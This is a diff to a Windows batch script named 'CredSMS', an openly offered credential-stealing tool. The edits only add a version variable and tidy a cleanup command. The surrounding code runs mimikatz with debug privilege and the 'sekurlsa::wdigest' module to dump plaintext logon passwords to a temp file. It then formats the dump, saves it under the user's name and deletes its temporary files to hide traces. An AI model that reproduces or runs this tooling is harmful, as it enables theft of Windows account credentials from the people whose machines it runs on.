@@ -2,6 +2,8 @@
 @echo off
 CLS
 
+Set VER=1.0
+
 :::::::::::::   CHANGE THESE VALUES  :::::::::::::::::
 ::
 :: 			Change These Before Running!
@@ -31,7 +33,7 @@ IF EXIST *.txt DEL *.txt /F /Q >nul 2>&1
 :: Parameters
 IF "%1"=="/?" (
 	Echo.
-	Echo    CredSMS 1.0, by SpokedVictor a.k.a Spok3d
+	Echo    CredSMS %VER%, by SpokedVictor a.k.a Spoked
 	Echo.
 	Echo /l = Save Locally
 	Echo /v = Version Info
@@ -40,7 +42,7 @@ IF "%1"=="/?" (
 )
 
 IF "%1"=="/v" (
-	Echo Version: 1.0
+	Echo Version: %VER%
 	Pause >nul 2>&1
 	Exit
 )
@@ -67,7 +69,7 @@ IF "%1"=="/l" (
 :: Start Program
 :Start
 Color 1A
-Title CredSMS v1.0
+Title CredSMS v%VER%
 Mode con:cols=47 lines=17
 CLS
 CC 1F
@@ -79,7 +81,7 @@ Echo                 Credential SMSer
 CC 1B
 Echo                 By SpokedVictor
 CC 13
-Echo                   Version 1.0
+Echo                   Version %VER%
 CC 1F
 Echo   I                                         I
 Echo   \----------------I   =X=   I--------------/
@@ -89,7 +91,7 @@ CC 1A
 :: Running Program (step0 basically)
 Echo  Running Mimikatz
 Start /B /W mimikatz.exe "privilege::debug" "sekurlsa::wdigest" Exit > %Temp%\mimikatz.txt
-Title CredSMS v1.0
+Title CredSMS v%VER%
 
 :: Formatting Output
 Echo  Formatting
@@ -146,7 +148,9 @@ Echo %S% >> Saves\%Username%.txt
 :: Cleaning Up
 :Done
 Echo  Done!
-IF EXIST %Temp%\*.txt Del /S /F /Q %Temp%\*.txt >nul 2>&1
+IF EXIST %Temp%\*.txt ( 
+	Del /S /F /Q %Temp%\*.txt >nul 2>&1
+	)
 CC 1F 
 Echo          Thank you!  (Any Key to Exit)
 Pause >nul 2>&1
